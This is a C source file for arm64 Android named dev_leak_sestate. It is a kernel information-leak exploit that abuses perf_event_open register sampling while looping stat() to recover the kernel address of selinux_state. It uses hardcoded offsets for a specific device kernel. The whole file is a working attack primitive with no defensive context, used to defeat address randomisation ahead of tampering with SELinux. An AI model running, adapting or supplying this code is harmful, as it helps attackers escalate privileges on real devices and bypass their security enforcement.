/* dev_leak_sestate: selinux_state register leak (o1s).
 * selinux_inode_permission+0x134: adrp x0 + add -> x0 = &selinux_state.
 * Perf SW_CPU_CLOCK + CALLCHAIN + REGS_INTR(all) while stat() looping;
 * filter IP in [fun+0x134, fun+0x150), read x0, validate + vote.
 * FUN runtime = text_base + 0x61fe8c (o1s vmlinux layout).
 * Oracle: 0xffffffc0... page-aligned data addr = &selinux_state. */
#include <errno.h>
#include <linux/perf_event.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <unistd.h>
#ifndef SYS_perf_event_open
#define SYS_perf_event_open 241
#endif
#define PERF_EVENT_IOC_ENABLE _IO('$', 0)
#define PERF_EVENT_IOC_DISABLE _IO('$', 1)
#define ARM64_REG_COUNT 33

static uint64_t ring_u64(const uint8_t *ring, uint64_t size, uint64_t pos)
{
    uint64_t v, off = pos & (size - 1);
    if (off + 8 <= size)
        memcpy(&v, ring + off, 8);
    else {
        uint8_t b[8];
        uint64_t first = size - off;
        memcpy(b, ring + off, first);
        memcpy(b + first, ring, 8 - first);
        memcpy(&v, b, 8);
    }
    return v;
}

int main(int argc, char **argv)
{
    uint64_t text_base =
        argc > 1 ? strtoull(argv[1], NULL, 0) : 0xffffffc010080000ULL;
    uint64_t fun = text_base + 0x61fe8c;
    struct perf_event_attr a;
    struct stat st;
    setvbuf(stdout, NULL, _IONBF, 0);
    alarm(120);
    printf("dev_leak_sestate: fun=%#llx\n", (unsigned long long)fun);
    memset(&a, 0, sizeof(a));
    a.type = PERF_TYPE_SOFTWARE;
    a.size = sizeof(a);
    a.config = PERF_COUNT_SW_CPU_CLOCK;
    a.sample_period = 1000;
    a.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_TID | PERF_SAMPLE_CALLCHAIN |
                    PERF_SAMPLE_REGS_INTR;
    a.sample_regs_intr = (1ULL << 33) - 1;
    a.sample_max_stack = 32;
    a.disabled = 1;
    a.exclude_user = 1;
    a.exclude_hv = 1;
    pid_t me = syscall(SYS_gettid);
    errno = 0;
    int fd = syscall(SYS_perf_event_open, &a, me, -1, -1, 0);
    printf("perf_open: fd=%d errno=%d tid=%d\n", fd, errno, me);
    if (fd < 0)
        return 2;
    long ps = sysconf(_SC_PAGESIZE);
    size_t msz = (size_t)ps * 129;
    struct perf_event_mmap_page *m =
        mmap(NULL, msz, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (m == MAP_FAILED)
        return 2;
    ioctl(fd, PERF_EVENT_IOC_RESET, 0);
    ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
    for (int i = 0; i < 150000; i++)
        syscall(SYS_newfstatat, -100, "/system/bin/sh", &st, 0);
    ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
    __sync_synchronize();
    uint8_t *ring = (uint8_t *)m + m->data_offset;
    uint64_t size = m->data_size, tail = m->data_tail, head = m->data_head;
    uint64_t cand[16] = {0};
    unsigned cnt[16] = {0};
    unsigned total = 0, infun = 0;
    uint64_t bk[24] = {0};
    unsigned bc[24] = {0};
    while (tail + 16 <= head) {
        uint8_t hb[16];
        uint64_t off = tail & (size - 1);
        if (off + 16 <= size)
            memcpy(hb, ring + off, 16);
        else {
            size_t first = size - off;
            memcpy(hb, ring + off, first);
            memcpy(hb + first, ring, 16 - first);
        }
        uint32_t type;
        uint16_t bsz;
        memcpy(&type, hb, 4);
        memcpy(&bsz, hb + 6, 2);
        if (bsz < 16 || tail + bsz > head)
            break;
        if (type == PERF_RECORD_SAMPLE) {
            uint64_t pos = tail + 8, ip = ring_u64(ring, size, pos);
            pos += 8;
            uint32_t spid, stid;
            memcpy(&spid, ring + (pos & (size - 1)), 4);
            uint64_t _o2 = pos & (size - 1);
            if (_o2 + 8 <= size) memcpy(&stid, ring + _o2 + 4, 4);
            else { uint8_t _b[8]; size_t _f = size - _o2; memcpy(_b, ring + _o2, _f); memcpy(_b + _f, ring, 8 - _f); memcpy(&stid, _b + 4, 4); }
            pos += 8;
            uint64_t nr = ring_u64(ring, size, pos);
            pos += 8 + nr * 8;
            uint64_t abi = ring_u64(ring, size, pos);
            pos += 8;
            if (abi && (int)stid == me) {
                total++;
                uint64_t bkt = ip & ~0xfffULL;
                unsigned k;
                for (k = 0; k < 24 && bk[k] && bk[k] != bkt; k++)
                    ;
                if (k < 24) {
                    bk[k] = bkt;
                    bc[k]++;
                }
            }
            if (abi && ip >= fun && ip < fun + 0x500)
                infun++;
            if (abi && ip >= fun && ip < fun + 0x500 &&
                pos + ARM64_REG_COUNT * 8 <= tail + bsz) {
                uint64_t x0 = ring_u64(ring, size, pos);
                if ((x0 & 0xffff000000000000ULL) == 0xffff000000000000ULL) {
                    unsigned s;
                    for (s = 0; s < 16 && cand[s] && cand[s] != x0; s++)
                        ;
                    if (s < 16) {
                        cand[s] = x0;
                        cnt[s]++;
                    }
                }
            }
        }
        tail += bsz;
    }
    uint64_t best = 0;
    unsigned bestc = 0;
    for (unsigned i = 0; i < 16; i++)
        if (cnt[i] > bestc) {
            bestc = cnt[i];
            best = cand[i];
        }
    for (unsigned k = 0; k < 24 && bk[k]; k++)
        printf("bucket %#llx x%u\n", (unsigned long long)bk[k], bc[k]);
    printf("dev_leak_sestate: total=%u infun=%u best=%#llx votes=%u\n",
           total, infun,
           (unsigned long long)best, bestc);
    munmap(m, msz);
    close(fd);
    return best ? 0 : 2;
}
